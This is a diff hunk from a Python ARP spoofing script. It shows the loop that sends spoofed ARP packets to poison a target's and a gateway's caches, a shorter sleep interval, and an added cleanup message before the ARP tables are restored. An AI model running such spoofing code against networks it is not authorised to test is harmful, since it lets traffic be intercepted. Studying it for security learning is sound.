@@ -70,8 +70,9 @@ try:
         spoof(target_ip=gateway_ip_address, spoof_ip=target_ip_address)
         packets_counter += 2
         print(f'\r[+] Sent {packets_counter} Spoofed Packets.', end='')
-        time.sleep(2)
+        time.sleep(1.7)
 except KeyboardInterrupt:
     print("\n[*] Detected 'ctrl + c' pressed, program terminated.\n")
+    print("\n[-] Cleaning up and re-arping targets...\n")
     restore(destination_ip=target_ip_address, source_ip=gateway_ip_address)
     restore(destination_ip=gateway_ip_address, source_ip=target_ip_address)
